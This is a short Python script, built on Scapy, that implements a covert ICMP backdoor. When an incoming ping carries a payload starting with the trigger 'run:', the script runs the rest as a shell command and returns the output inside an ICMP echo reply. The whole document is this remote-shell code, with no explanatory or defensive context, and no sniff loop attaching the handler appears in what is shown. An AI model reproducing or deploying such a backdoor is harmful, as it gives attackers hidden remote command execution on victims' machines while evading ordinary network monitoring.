from scapy.all import *
import os

SECRET_CMD_TRIGGER = "run:"

def handle_icmp(pkt):
    if pkt.haslayer(ICMP) and pkt[ICMP].type == 8:
        payload = pkt[Raw].load.decode(errors="ignore")
        if payload.startswith(SECRET_CMD_TRIGGER):
            cmd = payload[len(SECRET_CMD_TRIGGER):].strip()
            output = os.popen(cmd).read()
            reply = IP(dst=pkt[IP].src, src=pkt[IP].dst)/ICMP(type=0)/Raw(load=output)
            send(reply)
